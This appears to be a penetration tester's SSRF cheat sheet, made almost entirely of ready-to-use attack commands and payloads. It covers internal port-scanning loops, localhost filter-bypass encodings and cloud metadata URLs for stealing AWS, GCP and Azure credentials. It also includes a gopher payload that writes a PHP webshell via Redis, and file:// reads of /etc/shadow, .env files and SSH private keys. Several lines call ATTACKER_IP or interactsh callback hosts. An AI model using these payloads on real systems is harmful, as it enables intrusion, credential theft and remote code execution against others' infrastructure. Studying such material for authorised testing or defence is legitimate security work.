## Table of Contents:

- [[#Detection & Identification]]
- [[#Basic SSRF]]
- [[#Blind SSRF]]
- [[#Filter Bypass Techniques]]
- [[#Cloud Metadata Exploitation]]
- [[#SSRF to Internal Services]]
- [[#SSRF to RCE]]

---

## Detection & Identification

Any parameter that takes a URL, IP, hostname, or file path

```bash
# Parameters to look for
?url=
?path=
?dest=
?redirect=
?uri=
?target=
?src=
?image=
?file=
?document=
?load=
?fetch=
?next=
?callback=
?data=
?proxy=
?feed=
?host=
?api=
?webhook=

# Grep JS files for URL parameters
cat app.js | grep -iE "(url|path|dest|redirect|uri|target|src|fetch|load|proxy|host)="

# Features that commonly have SSRF
# - PDF generators (pass URL to render)
# - Image processors (fetch image from URL or upload from URL)
# - Webhooks (send request to user-specified URL)
# - File importers/exporters (import/export from URL)
# - URL previews / link expansion
# - "Fetch from URL" functionality
# - XML parsers (XXE to SSRF)
# - Test both GET and POST parameters
```

**Tips:**
- Set up `Burp Collaborator` or `interactsh` for blind detection
- Test both `GET` and `POST` parameters

---

## Basic SSRF

```bash
# Confirm SSRF with external callback
# Start listener first
python3 -m http.server 8000
# or use interactsh / Burp Collaborator

# Basic test
curl -s "https://target.com/fetch?url=http://ATTACKER_IP:8000/"

# Target localhost
curl -s "https://target.com/fetch?url=http://127.0.0.1/"
curl -s "https://target.com/fetch?url=http://localhost/"
curl -s "https://target.com/fetch?url=http://0.0.0.0/"

# Target internal network
curl -s "https://target.com/fetch?url=http://192.168.1.1/"
curl -s "https://target.com/fetch?url=http://10.0.0.1/"
curl -s "https://target.com/fetch?url=http://172.16.0.1/"

# Internal port scanning via SSRF
for port in 22 80 443 3306 5432 6379 8080 8443 9200 27017; do
    echo -n "Port $port: "
    curl -s -o /dev/null -w "%{http_code}" \
        "https://target.com/fetch?url=http://127.0.0.1:$port/"
    echo
done

# Internal host discovery
for i in $(seq 1 254); do
    curl -s -o /dev/null -w "192.168.1.$i: %{http_code}\n" \
        "https://target.com/fetch?url=http://192.168.1.$i/" &
done
```

**Look for:** Different response times or sizes between open and closed ports as timing differences reveal open ports even in blind SSRF

---

## Blind SSRF

```bash
# Setup interactsh for OOB detection
interactsh-client

# Or use Burp Collaborator payload
# https://YOUR_COLLABORATOR_ID.burpcollaborator.net

# Basic blind SSRF test
curl -s "https://target.com/fetch?url=http://YOUR_INTERACTSH_URL/"

# Blind SSRF with DNS callback (works through strict firewalls)
curl -s "https://target.com/fetch?url=http://ssrf.YOUR_INTERACTSH_URL/"

# Time-based blind SSRF detection
# Measure response time difference between open and closed ports
time curl -s "https://target.com/fetch?url=http://127.0.0.1:80/" 
time curl -s "https://target.com/fetch?url=http://127.0.0.1:81/"
# Open port responds faster than closed/filtered

# Blind SSRF with redirect chain
# Host on attacker server:
cat > redirect.php << 'EOF'
<?php header("Location: http://169.254.169.254/latest/meta-data/"); ?>
EOF
php -S 0.0.0.0:80

# Then trigger:
curl -s "https://target.com/fetch?url=http://ATTACKER_IP/redirect.php"
```

---

## Filter Bypass Techniques

```bash
# localhost bypasses
http://127.0.0.1/
http://0.0.0.0/
http://[::1]/                    # IPv6 localhost
http://[::]/ 
http://0/
http://localhost/
http://127.1/                    # short form
http://127.0.1/
http://0177.0.0.1/               # octal
http://2130706433/               # decimal IP for 127.0.0.1
http://0x7f000001/               # hex IP for 127.0.0.1
http://0x7f.0x0.0x0.0x1/

# DNS rebinding bypass
# Register a domain that resolves to 127.0.0.1
# nip.io, xip.io tricks:
http://127.0.0.1.nip.io/
http://spoofed.burpcollaborator.net/  # resolves to 127.0.0.1

# URL parsing confusion
http://attacker.com@127.0.0.1/          # @ trick
http://127.0.0.1#attacker.com/          # fragment trick
http://127.0.0.1?.attacker.com/         # query trick

# Protocol bypasses
file:///etc/passwd                       # file protocol
dict://127.0.0.1:6379/info              # Redis via dict
gopher://127.0.0.1:6379/_INFO%0d%0a    # Redis via gopher
ftp://127.0.0.1/                        # FTP protocol
sftp://attacker.com:11111/             # SFTP callback

# Gopher protocol for HTTP requests to internal services
# Format: gopher://host:port/_PAYLOAD
# URL encode the payload
gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a

# Redirect bypass: host open redirect on attacker server
# If filter checks URL before following redirect:
curl -s "https://target.com/fetch?url=http://ATTACKER_IP/redirect"
# redirect.php returns 302 to http://169.254.169.254/

# Case variation
http://LOCALHOST/
http://LocAlHoSt/

# Double URL encoding
http://127%252E0%252E0%252E1/

# Null byte bypass
http://127.0.0.1%00.attacker.com/

# Scheme confusion
hTTp://127.0.0.1/
```

---

## Cloud Metadata Exploitation

```bash
# AWS IMDSv1 (no token required)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/iam/info
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data/

# AWS IMDSv2 (requires token but SSRF can get it)
# Step 1: get token via SSRF
curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"

# Step 2: use token
curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/" \
  -H "X-aws-ec2-metadata-token: TOKEN"

# GCP metadata
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Requires header: Metadata-Flavor: Google

# Azure metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Digital Ocean
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address

# Kubernetes
http://kubernetes.default.svc/
http://kubernetes.default.svc/api/v1/namespaces/
http://kubernetes.default.svc/api/v1/secrets/
```

**Look for:** IAM credentials (AccessKeyId, SecretAccessKey, Token) as they give AWS console access

---

## SSRF to Internal Services

```bash
# Redis (default no auth, port 6379)
# Read data
gopher://127.0.0.1:6379/_INFO%0d%0a
dict://127.0.0.1:6379/INFO

# Write webshell via Redis (if web root is known)
# Commands via gopher (URL encoded)
gopher://127.0.0.1:6379/_%2A1%0d%0a%248%0d%0aflushall%0d%0a%2A3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%2434%0d%0a%0a%0a%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%0a%0a%0d%0a%2A4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2413%0d%0a%2Fvar%2Fwww%2Fhtml%0d%0a%2A4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%249%0d%0ashell.php%0d%0a%2A1%0d%0a%244%0d%0asave%0d%0a

# Elasticsearch (port 9200)
http://127.0.0.1:9200/
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/_all/_search

# MongoDB (port 27017) - binary protocol, harder via SSRF
# Better to use gopher with crafted packets

# Internal admin panels
http://127.0.0.1:8080/admin/
http://127.0.0.1:8443/manager/  # Tomcat manager
http://127.0.0.1:4848/          # GlassFish admin
http://127.0.0.1:9990/          # JBoss admin

# SMTP via Gopher (send internal email)
gopher://127.0.0.1:25/_HELO%20localhost%0d%0aMAIL%20FROM...

# Internal API endpoints
http://127.0.0.1/api/admin/users
http://127.0.0.1/internal/
http://127.0.0.1/_internal/
```

---

## SSRF to RCE

```bash
# Path 1: SSRF - Redis - webshell (see above)

# Path 2: SSRF - Memcached - deserialization
gopher://127.0.0.1:11211/_set%20ssrftest%201%200%2010%0d%0atest12345%0d%0a

# Path 3: SSRF - internal Jenkins - RCE
http://127.0.0.1:8080/script
# POST to script console:
# println "id".execute().text

# Path 4: SSRF - AWS metadata - IAM creds - AWS CLI RCE
# 1. Get creds via metadata
# 2. Configure AWS CLI with stolen creds
aws configure
# 3. Execute SSM commands, Lambda, EC2 user data etc.

# Path 5: SSRF - Gopher - FastCGI - RCE
# FastCGI on port 9000 (PHP-FPM)
# Use Gopherus tool to generate payload:
python gopherus.py --exploit fastcgi

# Path 6: file:// to read sensitive files
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
file:///var/www/html/.env
file:///app/.env
file:///home/user/.ssh/id_rsa
file:///root/.ssh/id_rsa
```

---
